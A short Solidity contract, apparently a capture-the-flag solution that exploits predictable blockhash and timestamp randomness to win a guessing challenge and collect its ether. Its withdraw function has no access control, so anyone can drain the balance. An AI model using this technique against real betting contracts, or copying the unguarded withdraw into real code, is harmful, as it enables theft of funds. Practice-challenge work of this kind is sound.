pragma solidity ^0.8.13;

import "hardhat/console.sol";


contract Predictor {

    address owner;
    address challenge;
    uint8 numberToGuess = 6;
    uint8 blockProducer;

    event LockInResultBytes(bytes result);
    event LockInNumberSuccess(bool success);
    event Success(bool success);

    constructor(address _challenge) {
        owner = msg.sender;
        challenge = _challenge;
    }

    function getNumber() public view returns (uint8) {
        bytes memory payload = abi.encodePacked(blockhash(block.number - 1), block.timestamp);
        return uint8(uint(keccak256(payload))) % 10;
    }

     function lockNumber() public payable returns(bool) {

        require(msg.value == 1 ether, "Value is not enough");
        bytes4 payload = bytes4(keccak256(("lockInGuess(uint8)")));
        (bool success, bytes memory resultBytes) = challenge.call{value: 1 ether}(
            abi.encodeWithSelector(payload, numberToGuess)
        );
        emit LockInNumberSuccess(success);
        emit LockInResultBytes(resultBytes);
        return true;
     }

    function solveChallenge() public {

        uint8 newNumber = getNumber();

        require(numberToGuess == newNumber, "Numbers are not not equal");

        bytes4 selector = bytes4(keccak256("settle()"));
        bytes memory payload = abi.encodeWithSelector(selector);
        challenge.call(payload);
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    function dummyBlockIterator() public {
        blockProducer += 1;
    }

    receive() external payable {}

}
